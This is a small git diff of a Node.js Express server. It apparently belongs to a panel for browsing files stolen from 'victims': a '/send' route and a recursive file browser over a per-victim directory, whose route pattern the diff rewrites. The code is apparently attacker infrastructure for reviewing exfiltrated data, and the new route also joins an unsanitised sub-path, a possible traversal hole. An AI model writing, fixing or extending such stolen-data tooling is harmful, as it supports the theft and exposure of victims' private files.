@@ -71,10 +71,10 @@ app.post("/send", async (req, res) => {
 });
 
 // --- Browse victim files (recursive) - must be BEFORE /victim/:id ---
-app.get('/victim/:id/*', async (req, res) => {
-  const safeId = path.basename(req.params.id);
+app.get(/^\/victim\/([^\/]+)\/(.+)/, async (req, res) => {
+  const safeId = path.basename(req.params[0]);
   const victimDir = path.join(VICTIMS_DIR, safeId);
-  const subPath = req.params[0] || '';
+  const subPath = req.params[1];
   const fullPath = path.join(victimDir, subPath);
 
   // Check if it's a directory
